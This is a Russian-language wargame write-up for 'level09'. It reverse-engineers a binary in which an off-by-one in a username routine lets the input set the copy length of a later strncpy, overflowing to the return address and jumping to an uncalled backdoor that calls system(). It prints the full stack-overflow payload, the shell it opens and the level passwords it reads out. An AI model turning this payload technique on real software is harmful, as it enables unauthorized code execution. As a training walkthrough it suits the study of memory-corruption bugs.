## HowTo

```
> su level09
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

### Инструменты:
- Ida Pro + hex rays
- gdb + peda

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения
1. Программа читает юзернейм и сообщение, после чего "отправляет его" - на самом деле просто записывает в адресс
2. Анализ через IdaPro также показывает функцию `secret_backdoor()`, 
которая читает с `stdin` строку и запускает указанное в ней через `system()`. Она нигде не вызывается
3. Main вызывает `handle_message`, внутри которого вызываются `set_username`, `set_msg`
4. Обе функции работают с адресом, полученным в качестве аргумента (переменная `a1` в псевдокоде).
5. Анализ `set_username`
```
char s[140]; // [rsp+10h] [rbp-90h
fgets(s, 128, stdin);
for ( i = 0; i <= 40 && s[i]; ++i )
   *(_BYTE *)(a1 + i + 140) = s[i];
```
- `a1` переменная хранящая адрес переданной переменной (общий адрес, разделяемый функциями)
- в буфер `140` читается имя юзера, затем `41` байт записывается по адрему `a1` с оффсетом `140`
6. Анализ `set_msg`
```
  char s; // [rsp+10h] [rbp-400h]
  memset(&s, 0, 0x400uLL);
  fgets(&s, 1024, stdin);
  return strncpy((char *)a1, &s, *(signed int *)(a1 + 180));
```
- в буфер `1024` читаем `1024` байта
- копируем `n-байт` в начало адреса `a1` из буфера, где `n` - интовое значение прочитанное из `a1 + 180`
7. В `set_username` записывается `41` байт (начиная с оффсета `+140`), а в `set_msg` 
размер копирования для `strncpy` берется по оффсету `+180` байт.
Можно заметить, что у нас есть `1` лишний байт, куда можно подложить интовое значение `n` для `strnpy`
8. Общая схема работы функций с шаренным адресом
``` 
1. set_username
    -> read 128
                put uname   put +1
                $rax+140    $rax+140+1
                    ||       ||
                    ||       ||
                    \/       \/
           140b         40b       1b
    |---------------|---------|-------|
    0 ($rax)       140        180    181
    /\                        /\
    ||                        ||
    ||                        ||
    ||                        ||
    put msg                 read signed int 
    $rax+0                  from $rax+180

2. set_msg
    -> read 1024 
```

### Идея взлома
- попробуем перезаписать адрес `eip set_msg`, используя работу с общим адресом в `set_username`, `set_msg`
- подложим туда адрес `secret_backdoor` + аргумент для нее `'/bin/sh'`
1. Находим адрес `secret_backdoor`
```
gdb ./level09
x/s secret_backdoor 
0x55555555488c
```

2. Находим адрес `eip`.
- Переполнение через `peda pattern` результата не дало.
- анализ asm показал, что в обеих функциях происходит всего 1 `push`
- мы также знаем, что программа выделяет буфер для размещения данных, шаремых между функциями
- находим смещение до начала этого буфера, добавляем оверхед на `push`, получаем ожидаемый оффсет до `eip`
```
Dump of assembler code for function handle_msg:
   ...
   0x0000555555554906 <+70>:	lea    rax,[rbp-0xc0]   -------> buff start (192)
   ...
   0x0000555555554910 <+80>:	call   0x5555555549cd <set_username>
        Dump of assembler code for function set_username:
        0x00005555555549cd <+0>:	push   rbp          -------> single push
   ...
   0x000055555555491f <+95>:	call   0x555555554932 <set_msg>
        Dump of assembler code for function set_msg:
        0x0000555555554932 <+0>:	push   rbp          -------> single push
   ...
```

Так что мы считаем, что смещение до `eip set_msg` находится в конце буфера - со смещением `192 + 4 + 4 = 200`
```
 [rbp-0xc0]
    |---------|---------|-------|
    0        192       196     200 - eip
```

3. Теперь у нас есть все для приготовлений `payload`
- `'a' * 40` - паддинг для заполнения `40` байт имени пользователя
- `\0xd0` - `1` байт на число `208` - мы хотим, чтобы `strcpy` скопировал паддинг до `eip` (`200`) + `8` на адрес `secret_backdoor`
- `\n` чтобы обозначить конец буффера, т.к. мы хотим попасть в 2 вызова `gets`
- `'a' * 200` - паддинг до `eip`
- `'\x8c\x48\x55\x55\x55\x55\x00\x00'` - инвертированный и дополненный до 8 адрес `secret_backdoor`
- `'/bin/sh` - аргумент для `secret_backdoor`

```
cat <(python -c "print('a' * 40 + '\xd0' + '\n' + 'a' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh')") -| ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```